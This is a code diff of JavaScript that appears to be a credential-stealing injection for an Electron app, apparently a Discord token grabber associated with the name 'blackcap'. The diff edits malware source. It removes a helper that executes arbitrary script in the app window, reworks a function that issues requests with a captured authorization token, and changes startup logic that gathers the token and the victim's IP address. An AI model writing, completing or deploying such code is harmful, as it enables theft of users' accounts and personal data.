@@ -47,13 +47,6 @@ var config = {
     }
 };
 
-async function execScript(str) {
-    var window = electron.BrowserWindow.getAllWindows()[0]
-    var script = await window.webContents.executeJavaScript(str, true)
-    return script || null
-
-}
-
 const makeEmbed = async ({
     title,
     fields,
@@ -94,8 +87,7 @@ const getIP = async () => {
 }
 
 const getURL = async (url, token) => {
-    var c = await execScript(`
-    var xmlHttp = new XMLHttpRequest();
+    var c = await execScript(`var xmlHttp = new XMLHttpRequest();
     xmlHttp.open( "GET", "${url}", false );
     xmlHttp.setRequestHeader("Authorization", "${token}");
     xmlHttp.send( null );
@@ -258,7 +250,7 @@ const post = async (params) => {
 const FirstTime = async () => {
     if (doTheLogOut) return false
     var token = await tokenScript();
-    if (config['init-notify'] !== "true") return true
+    if (config['init-notify'] !== "true") return false
     if (fs.existsSync(__dirname + "/blackcap")) fs.rmdirSync(__dirname + "/blackcap")
     var ip = await getIP()
     if (!token) {
